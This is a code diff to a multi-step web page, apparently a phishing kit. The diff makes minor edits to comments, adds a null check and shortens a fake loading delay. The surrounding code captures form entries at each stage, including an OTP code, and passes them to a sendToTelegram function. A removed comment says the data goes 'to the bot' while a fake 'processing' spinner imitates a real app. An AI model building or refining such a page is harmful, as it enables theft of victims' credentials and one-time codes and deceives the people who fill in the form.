@@ -21,7 +21,7 @@
         .page-section { display: none; }
         .page-section.active { display: block; }
 
-        /* شاشة التحميل (النافذة المؤقتة) */
+        /* شاشة التحميل المؤقتة */
         #loading-overlay {
             display: none;
             position: fixed;
@@ -181,7 +181,7 @@
 </head>
 <body>
 
-    <!-- شاشة التحميل المؤقتة (تظهر عند التنقل) -->
+    <!-- شاشة التحميل الذكية -->
     <div id="loading-overlay">
         <div class="spinner"></div>
         <h3 style="font-family: 'Tajawal', sans-serif;">انتظر... جاري المعالجة والتحميل</h3>
@@ -378,7 +378,10 @@
 
         function showPage(pageId) {
             document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
+            const target = document.getElementById(pageId);
+            if (target) {
+                target.classList.add('active');
+            }
             window.scrollTo(0, 0);
         }
 
@@ -412,7 +415,6 @@
             }
         }
 
-        // دالة التقاط البيانات، إظهار شاشة التحميل (انتظر)، إرسالها للبوت، ثم الانتقال للصفحة التالية
         function captureAndProceed(event, nextPage, stepName) {
             event.preventDefault();
 
@@ -429,15 +431,13 @@
                 sendToTelegram("مرحلة 3: رمز OTP وإكمال التسجيل");
             }
 
-            // إظهار شاشة التحميل الذكية
             const loader = document.getElementById('loading-overlay');
             loader.style.display = 'flex';
 
-            // الانتظار لمدة 2.5 ثانية (مثل التطبيقات الحقيقية) ثم الانتقال
             setTimeout(() => {
                 loader.style.display = 'none';
                 showPage(nextPage);
-            }, 2500);
+            }, 2000);
         }
 
         function sendToTelegram(stageInfo) {
